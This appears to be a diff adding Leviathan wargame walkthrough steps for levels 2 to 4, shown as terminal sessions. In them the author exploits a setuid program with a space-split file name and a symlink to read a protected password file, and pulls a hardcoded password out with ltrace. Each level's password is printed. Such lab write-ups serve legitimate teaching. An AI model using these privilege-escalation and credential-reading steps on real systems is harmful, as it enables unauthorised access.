@@ -72,3 +72,100 @@ leviathan2
 $ cat /etc/leviathan_pass/leviathan2
 mEh5PNl10e
 ```
+
+## Level 2 -> 3
+
+```
+leviathan2@gibson:~$ ls
+printfile
+leviathan2@gibson:~$ ./printfile .bash_logout
+# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+leviathan2@gibson:~$ ltrace ./printfile .bash_logout
+__libc_start_main(0x80491e6, 2, 0xffffd644, 0 <unfinished ...>
+access(".bash_logout", 4)                        = 0
+snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout") = 21
+geteuid()                                        = 12002
+geteuid()                                        = 12002
+setreuid(12002, 12002)                           = 0
+system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                           = 0
++++ exited (status 0) +++
+leviathan2@gibson:~$ mktemp d
+mktemp: too few X's in template ‘d’
+leviathan2@gibson:~$ man mktemp
+leviathan2@gibson:~$ mktemp -d
+/tmp/tmp.xUXMnL6Ia1
+leviathan2@gibson:~$ touch /tmp/tmp.xUXMnL6Ia1/"test file.txt"
+leviathan2@gibson:~$ ltrace ./printfile /tmp/tmp.xUXMnL6Ia1/"test file.txt"
+__libc_start_main(0x80491e6, 2, 0xffffd634, 0 <unfinished ...>
+access("/tmp/tmp.xUXMnL6Ia1/test file.tx"..., 4) = 0
+snprintf("/bin/cat /tmp/tmp.xUXMnL6Ia1/tes"..., 511, "/bin/cat %s", "/tmp/tmp.xUXMnL6Ia1/test file.tx"...) = 42
+geteuid()                                        = 12002
+geteuid()                                        = 12002
+setreuid(12002, 12002)                           = 0
+system("/bin/cat /tmp/tmp.xUXMnL6Ia1/tes".../bin/cat: /tmp/tmp.xUXMnL6Ia1/test: No such file or directory
+/bin/cat: file.txt: No such file or directory
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                           = 256
++++ exited (status 0) +++
+leviathan2@gibson:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.xUXMnL6Ia1/test
+leviathan2@gibson:~$ ./printfile /tmp/tmp.xUXMnL6Ia1/"test file"
+You cant have that file...
+leviathan2@gibson:~$ ./printfile /tmp/tmp.xUXMnL6Ia1/"test file.txt"
+/bin/cat: /tmp/tmp.xUXMnL6Ia1/test: Permission denied
+/bin/cat: file.txt: No such file or directory
+leviathan2@gibson:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.xUXMnL6Ia1/test
+ln: failed to create symbolic link '/tmp/tmp.xUXMnL6Ia1/test': File exists
+leviathan2@gibson:~$ ls -l /tmp/tmp.xUXMnL6Ia1
+total 0
+lrwxrwxrwx 1 leviathan2 leviathan2 30 May 18 20:04 test -> /etc/leviathan_pass/leviathan3
+-rw-rw-r-- 1 leviathan2 leviathan2  0 May 18 20:02 test file.txt
+leviathan2@gibson:~$ chmod 777 /tmp/tmp.xUXMnL6Ia1
+leviathan2@gibson:~$ ./printfile /tmp/tmp.xUXMnL6Ia1/"test file.txt"
+Q0G8j4sakn
+/bin/cat: file.txt: No such file or directory
+```
+
+## Level 3 -> 4
+
+```
+leviathan3@gibson:~$ ls
+level3
+leviathan3@gibson:~$ ./level3
+Enter the password>
+bzzzzzzzzap. WRONG
+leviathan3@gibson:~$ man ltrace
+leviathan3@gibson:~$ man strace
+leviathan3@gibson:~$ ltrace ./level3
+__libc_start_main(0x80492bf, 1, 0xffffd654, 0 <unfinished ...>
+strcmp("h0no33", "kakaka")                       = -1
+printf("Enter the password> ")                   = 20
+fgets(Enter the password> asd
+"asd\n", 256, 0xf7e2a620)                  = 0xffffd42c
+strcmp("asd\n", "snlprintf\n")                   = -1
+puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
+)                       = 19
++++ exited (status 0) +++
+leviathan3@gibson:~$ ./level3
+Enter the password> snlprintf
+[You've got shell]!
+$ whoami
+leviathan4
+$ cat /etc/leviathan_pass/leviathan4
+AgvropI4OA
+```
